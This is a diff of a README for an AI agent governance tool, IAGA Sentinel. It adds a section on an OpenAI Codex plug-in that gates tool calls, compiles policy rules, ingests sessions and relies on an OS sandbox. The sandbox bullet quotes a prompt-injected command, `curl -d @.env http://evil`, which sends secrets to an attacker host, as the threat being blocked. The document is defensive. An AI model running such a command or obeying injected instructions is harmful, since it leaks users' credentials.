@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/version-1.5.2-0f9d6b?style=flat-square" alt="version" />
+  <img src="https://img.shields.io/badge/version-1.5.3-0f9d6b?style=flat-square" alt="version" />
   <img src="https://img.shields.io/badge/license-BUSL--1.1-0f9d6b?style=flat-square" alt="license" />
   <img src="https://img.shields.io/badge/EU%20AI%20Act-Art.%2012%20and%20Annex%20IV-0B0F0E?style=flat-square" alt="EU AI Act Article 12 and Annex IV" />
   <img src="https://img.shields.io/badge/Rust-stable-0B0F0E?style=flat-square" alt="Rust" />
@@ -81,16 +81,33 @@ The operator dashboard is at <http://localhost:4010/> the moment the server is u
 
 ---
 
+## In the loop with OpenAI Codex
+
+Most integrations **observe**: they ask for a verdict and certify what happened. The OpenAI Codex plug-in is the first that also **acts inside the agent's loop**, adding a third verb to *enforces softly and certifies hard*: **enforces inside the loop**. It is IAGA Sentinel's first **vertical plug-in**: a deep, framework-specific adapter under active development, and its first end-to-end, bidirectional integration.
+
+- **The gate.** Codex's native `PreToolUse` hook routes every tool call through `POST /v1/inspect` before it runs. A `block` verdict stops the action inside Codex (exit 2) and hands the model the policy reason; a signed receipt is minted either way. **Fail-closed by default**: no verdict means the action does not run.
+- **The compiler.** `iaga-codex export-rules` compiles an APL bundle into Codex's **native** execpolicy `.rules`, a static command-prefix layer that holds even when hooks are disabled. Both layers merge strictest-wins.
+- **The ingest.** `iaga-codex ingest` turns a `codex exec --json` session (live from a pipe, a spawned run, or a captured file) into the same signed receipt chain, so even sessions that ran *without* the gate leave verifiable evidence. This is the **advisory** tier: the verdict is recorded, never applied.
+- **The sandbox (Phase 2).** Run Codex under its native OS sandbox and the egress threat closes *below* the model: a prompt-injected `curl -d @.env http://evil` cannot even open the socket, because outbound network is denied by default. The secret never leaves the box even if every cooperative check were stripped out. The gate still attests the attempt; the enforcer here is the OS sandbox, not Sentinel, so the receipt stays honest (`is_authoritative: false`).
+
+This integration spans the full enforcement ladder: **advisory** (ingest: recorded after the fact), **agent-loop** (gate: the action is actually stopped, unless the host disables the hook), and **kernel** (reserved). The limit stays written into the evidence: every receipt carries `is_authoritative: false`. The plug-in is fully isolated: all Codex-specific code lives in the `iaga-codex` binary, and the `iaga` core depends on none of it.
+
+**In active development.** [`STATUS.md`](examples/integrations/codex/STATUS.md) tracks the honest what-works list and the roadmap: non-disableable managed hooks (`requirements.toml`), a Sentinel egress proxy that allowlists domains and mints a receipt per connection, and human-in-the-loop `ask` verdicts.
+
+→ [`examples/integrations/codex/`](examples/integrations/codex/) · [STATUS & roadmap](examples/integrations/codex/STATUS.md) · [ADR 0022](docs/adr/0022-codex-integration.md)
+
+---
+
 ## Documentation
 
-**Everything lives at [www.iaga.tech/docs](https://www.iaga.tech/docs):** the full zero-to-verified-evidence tutorial, framework integrations (LangChain, Claude Code, MCP, OpenAI, and 11 more), the APL policy language, cost control and budgets, API keys and scopes, configuration and environment variables, the production checklist, and troubleshooting.
+**Everything lives at [www.iaga.tech/docs](https://www.iaga.tech/docs):** the full zero-to-verified-evidence tutorial, framework integrations (LangChain, Claude Code, OpenAI Codex, MCP, and 12 more), the APL policy language, cost control and budgets, API keys and scopes, configuration and environment variables, the production checklist, and troubleshooting.
 
 In this repository:
 
 - [`CHANGELOG.md`](CHANGELOG.md): release notes
 - [`docs/openapi.yaml`](docs/openapi.yaml): the full HTTP API specification
-- [`docs/adr/`](docs/adr/): architectural decision records (0001–0021)
-- [`examples/integrations/`](examples/integrations/): copy-paste adapter examples for 15 frameworks
+- [`docs/adr/`](docs/adr/): architectural decision records (0001–0022)
+- [`examples/integrations/`](examples/integrations/): copy-paste adapter examples for 16 frameworks (incl. the [OpenAI Codex](examples/integrations/codex/) in-the-loop plug-in)
 - [`sdks/`](sdks/): Python and TypeScript SDKs
 - [`SECURITY.md`](SECURITY.md) · [`DATA_HANDLING.md`](DATA_HANDLING.md) · [`CONTRIBUTING.md`](CONTRIBUTING.md)
 
@@ -131,7 +148,10 @@ Research-validated, not marketing-validated.
 
 ## Status
 
-Current release: **1.5.2** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
+> [!NOTE]
+> **New in 1.5.3: a vertical, in-the-loop plug-in.** The [OpenAI Codex plug-in](#in-the-loop-with-openai-codex) lands as IAGA Sentinel's first end-to-end, bidirectional integration: a `block` verdict stops an action *inside* the agent's loop, and a Phase 2 milestone pairs the gate with Codex's OS sandbox so prompt-injected egress can't even open the socket. Standalone `iaga-codex` binary; the `iaga` core is unchanged. See [ADR 0022](docs/adr/0022-codex-integration.md) and [STATUS.md](examples/integrations/codex/STATUS.md).
+
+Current release: **1.5.3** ([release notes](CHANGELOG.md)). CI runs the full workspace test suite (default and `--all-features`), live-Postgres receipt tests, SDK end-to-end smokes against a real sidecar, and clippy with `-D warnings`. All green from a clean checkout.
 
 ---
 
